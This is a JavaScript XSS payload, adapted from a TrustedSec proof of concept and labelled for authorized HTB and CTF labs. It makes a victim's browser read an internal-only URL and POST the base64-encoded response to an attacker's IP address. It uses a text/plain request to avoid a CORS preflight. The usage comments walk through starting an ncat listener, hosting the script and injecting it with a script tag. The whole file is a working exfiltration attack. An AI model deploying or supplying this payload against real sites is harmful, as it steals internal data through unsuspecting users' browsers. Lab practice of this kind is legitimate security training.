// myexfilxss
// Based on the TrustedSec XSS data-exfil PoC.
// Reads an internal-only URL from the victim's browser and sends
// the whole response back in a single POST body (base64).
// For authorized labs only (HTB, CTF, own environments).

function read_body(xhr)
{
	var data;

	if (!xhr.responseType || xhr.responseType === "text")
	{
		data = xhr.responseText;
	}
	else if (xhr.responseType === "document")
	{
		data = xhr.responseXML;
	}
	else if (xhr.responseType === "json")
	{
		data = xhr.responseJSON;
	}
	else
	{
		data = xhr.response;
	}
	return data;
}

// USAGE
// 1) Start the listener on your machine (receives the exfiltrated data):
//      sudo ncat -klvnp 80
// 2) Set the internal URL to read, in "uri" below (this is the target
//    that is only reachable from the victim's browser, e.g. http://127.0.0.1:8080/).
// 3) Set your own IP in the exfil.open(...) line below (your tun0 / attacker IP).
// 4) Host this file on a different port than the listener (port 80 is taken by ncat):
//      python3 -m http.server 8000
//    and load it through the XSS: <script src="http://YOUR_IP:8000/myexfilxss.js"></script>
// 5) The base64 body arrives at the end of the POST request: decode it with base64 -d.

function stealData()
{
	// INTERNAL URL TO READ: change the URL here
	var uri = "http://127.0.0.1:4566/";

	var xhr = new XMLHttpRequest();
	xhr.open("GET", uri, true);
	xhr.send(null);

	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			// We have the response back with the data
			var dataResponse = read_body(xhr);

			// Send the whole response in a single POST body
			// text/plain avoids the CORS preflight
			var exfil = new XMLHttpRequest();
			// YOUR IP: change the IP here (must match the ncat listener on port 80)
			exfil.open("POST", "http://10.10.14.212/exfil", true);
			exfil.setRequestHeader("Content-Type", "text/plain");
			exfil.send(btoa(dataResponse));

			console.log("Done exfiling..");
		}
	};
}

stealData();
